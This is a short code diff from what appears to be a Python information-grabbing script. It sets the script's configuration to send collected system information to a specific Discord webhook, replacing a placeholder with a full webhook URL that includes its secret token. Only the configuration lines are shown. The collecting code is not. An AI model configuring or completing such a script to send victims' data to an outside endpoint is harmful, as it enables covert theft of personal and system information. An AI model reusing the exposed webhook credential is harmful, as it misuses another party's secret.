@@ -10,7 +10,7 @@ import platform as osinfo
 
 # CONFIGURATION:
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1358934908743188742/LNkJsXCWhlxFOktujN3d7OxN06CMtH8afAhIzm8ru-WRvxIA8ugNT6R0lxlLx_-weaGh'
 
 # determines what information you wanna send
 # none of this works in raw
